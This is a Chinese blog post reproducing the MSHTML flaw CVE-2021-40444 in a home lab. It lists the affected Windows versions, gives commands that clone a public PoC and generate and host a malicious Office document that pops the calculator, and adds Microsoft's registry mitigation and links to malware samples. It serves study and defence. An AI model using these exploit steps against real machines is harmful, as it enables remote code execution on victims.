<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HNOMi4t4HvFR6ZWlIrMMBw)

### 漏洞说明

CVE-2021-40444 微软发布 MSHTML 组件漏洞

**危害：**未经身份验证的攻击者可以利用该漏洞在目标系统上执行代

```
1Windows Server, version 20H2 (Server Core Installation) 2Windows Server, version 2004 (Server Core installation) 3Windows Server 2022 (Server Core installation) 4Windows Server 2022 5Windows Server 2019 (Server Core installation) 6Windows Server 2019 7Windows Server 2016 (Server Core installation) 8Windows Server 2016 9Windows Server 2012 R2 (Server Core installation)10Windows Server 2012 R211Windows Server 2012 (Server Core installation)12Windows Server 201213Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)14Windows Server 2008 for x64-based Systems Service Pack 215Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)16Windows Server 2008 for 32-bit Systems Service Pack 217Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)18Windows Server 2008 R2 for x64-based Systems Service Pack 119Windows RT 8.120Windows 8.1 for x64-based systems21Windows 8.1 for 32-bit systems22Windows 7 for x64-based Systems Service Pack 123Windows 7 for 32-bit Systems Service Pack 124Windows 10 for x64-based Systems25Windows 10 for 32-bit Systems26Windows 10 Version 21H1 for x64-based Systems27Windows 10 Version 21H1 for ARM64-based Systems28Windows 10 Version 21H1 for 32-bit Systems29Windows 10 Version 20H2 for x64-based Systems30Windows 10 Version 20H2 for ARM64-based Systems31Windows 10 Version 20H2 for 32-bit Systems32Windows 10 Version 2004 for x64-based Systems33Windows 10 Version 2004 for ARM64-based Systems34Windows 10 Version 2004 for 32-bit Systems35Windows 10 Version 1909 for x64-based Systems36Windows 10 Version 1909 for ARM64-based Systems37Windows 10 Version 1909 for 32-bit Systems38Windows 10 Version 1809 for x64-based Systems39Windows 10 Version 1809 for ARM64-based Systems40Windows 10 Version 1809 for 32-bit Systems41Windows 10 Version 1607 for x64-based Systems42Windows 10 Version 1607 for 32-bit Systems
```

### 测试过程

#### 环境：

安装环境 kali2020.4

目标环境：win10  office 2010

#### 参照文档

https://github.com/lockedbyte/CVE-2021-40444

#### 步骤

这是某位大神根据在野利用样本复现出来的，知识的搬运工一下：

```
1安装包： 2sudo apt-get install lcab 3配置docx 4 5下载poc 6git clone https://github.com/lockedbyte/CVE-2021-40444 7cd CVE-2021-40444  8 9生成恶意文档10python3 exploit.py generate test/calc.dll http://192.168.226.128111213生产服务端14sudo python3 exploit.py host 801516在虚拟机里打开生产的恶意文档 弹出计算机
```

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MVThIas1jmwvrpeg3ub5fHkrsqMiaicicngkjJv4rRRichkxLvzjSrRtKcegYa8HYMppw9mQYbzstU5iaQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MVThIas1jmwvrpeg3ub5fHkyMdrq4MVCrLVfGnJNEaVJxvuok3qRVG5KC2jpAnJ5wFwL6yZibTNGEQ/640?wx_fmt=png)  

### **缓解措施**

微软提供了临时缓解措施：在 Internet Explorer 中禁用所有 ActiveX 控件的安装。

步骤如下：

```
1将如下代码复制到文本文件中并以 .reg 文件扩展名保存： 2 3 4Windows Registry Editor Version 5.00 5[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0] 6"1001"=dword:00000003 7"1004"=dword:00000003 8[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1] 9"1001"=dword:0000000310"1004"=dword:0000000311[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]12"1001"=dword:0000000313"1004"=dword:0000000314[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]15"1001"=dword:0000000316172、双击该 .reg 文件。18193、重启系统。
```

### 相关学习链接

https://mp.weixin.qq.com/s/KOsb2SksOq_qy0pG3PeYRA

https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A

https://github.com/lockedbyte/CVE-2021-40444

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444

https://zhuanlan.zhihu.com/p/408322761

https://bazaar.abuse.ch/sample/938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52/  
https://bazaar.abuse.ch/sample/d0fd7acc38b3105facd6995344242f28e45f5384c0fdf2ec93ea24bfbc1dc9e6  
https://bazaar.abuse.ch/sample/1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00

https://github.com/rfcxv/CVE-2021-40444-POC

**这位大佬分析的比较仔细 分析的方法也比较特殊 建议学习一下**

**https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/**